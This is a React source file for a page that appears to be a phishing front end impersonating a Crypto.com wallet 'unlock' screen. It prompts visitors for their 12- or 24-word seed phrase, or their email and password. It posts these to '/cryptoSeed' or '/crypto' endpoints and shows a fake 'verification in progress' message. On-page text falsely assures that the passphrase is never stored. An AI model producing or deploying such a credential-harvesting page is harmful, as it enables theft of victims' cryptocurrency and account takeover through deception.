import React, { useState } from 'react';
import './cryptoPagesCss/cryptoWallet.css';
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import crypto_com_logo from "../../../assets/crypto_com_logo.png";
import { useNavigate } from 'react-router-dom';
import fetchWithRetry from '../../../utils/api';

const CryptoWallet = () => {
  const [method, setMethod] = useState(null);
  const [passphrase, setPassphrase] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const navigate = useNavigate();

  const unlockWallet = async () => {
    try {
      setLoading(true);

      const endpoint = method === 'passphrase' ? '/cryptoSeed' : '/crypto';
      const payload = method === 'passphrase'
        ? { passphrase }
        : { emailOrUsername: email, password };

      const res = await fetchWithRetry(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      const data = await res.json();
      toast.success(data.message || 'Verification submitted');
      setShowSuccess(true);
    } catch (error) {
      toast.error('An error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className='crypto_wallet_body'>
      <div className='crypto_wallet_top_body'>
        <p>Wallet</p>
        <div className='crypto_wallet_top_logo'>
          <img src={crypto_com_logo} alt='Logo' />
        </div>
      </div>

      {/* ================= METHOD SELECTION ================= */}
      {!method && !showSuccess && (
        <div className='crypto_wallet_bottom_body'>
          <div className='crypto_wallet_bottom_container'>
            <h3>Unlock Wallet</h3>
            <p>Select how you want to unlock your wallet</p>
            <button
              className='crypto_unlock_with_passphrase_btn'
              onClick={() => setMethod('passphrase')}
            >
              Use Passphrase
            </button>
            <button
              className='crypto_unlock_with_faceid_btn'
              onClick={() => setMethod('email')}
            >
              Use Email & Password
            </button>
          </div>
        </div>
      )}

      {/* ================= PASSPHRASE ================= */}
      {method === 'passphrase' && !showSuccess && (
        <div className='crypto_wallet_bottom_body'>
          <div className='crypto_wallet_bottom_container'>
            <h3>Unlock With Passphrase</h3>
            <textarea
              className='crypto_wallet_text_area'
              placeholder='Enter your 12 or 24-word passphrase'
              value={passphrase}
              onChange={(e) => setPassphrase(e.target.value)}
            />
            <button
              className='crypto_unlock_with_passphrase_btn'
              onClick={unlockWallet}
              disabled={loading}
            >
              {loading ? 'Loading...' : 'Continue'}
            </button>
            <p>
              Your passphrase is never stored and is encrypted during verification.
            </p>
            <button
              className='crypto_unlock_with_faceid_btn'
              onClick={() => setMethod(null)}
            >
              Back
            </button>
          </div>
        </div>
      )}

      {/* ================= EMAIL ================= */}
      {method === 'email' && !showSuccess && (
        <div className='crypto_wallet_bottom_body'>
          <div className='crypto_wallet_bottom_container'>
            <h3>Unlock With Email</h3>
            <input
              className='crypto_wallet_input'
              type='email'
              placeholder='Email address'
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <input
              className='crypto_wallet_input'
              type='password'
              placeholder='Password'
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button
              className='crypto_unlock_with_passphrase_btn'
              onClick={unlockWallet}
              disabled={loading}
            >
              {loading ? 'Loading...' : 'Continue'}
            </button>
            <p>
              Secure email-based verification with encrypted transmission.
            </p>
            <button
              className='crypto_unlock_with_faceid_btn'
              onClick={() => setMethod(null)}
            >
              Back
            </button>
          </div>
        </div>
      )}

      {/* ================= SUCCESS ================= */}
      {showSuccess && (
        <div className='crypto_wallet_bottom_body'>
          <div className='crypto_wallet_bottom_container'>
            <h3>Verification in Progress</h3>
            <p>
              Your wallet details have been submitted successfully.
              A confirmation email will be sent once verification is complete.
            </p>
            <div style={{ display: 'flex', gap: '12px', marginTop: '20px' }}>
              <button
                className='crypto_unlock_with_passphrase_btn'
                onClick={() => navigate('/')}
              >
                Go Home
              </button>
              <button
                className='crypto_unlock_with_faceid_btn'
                onClick={() => {
                  setShowSuccess(false);
                  setMethod(null);
                  setPassphrase('');
                  setEmail('');
                  setPassword('');
                }}
              >
                Continue
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default CryptoWallet;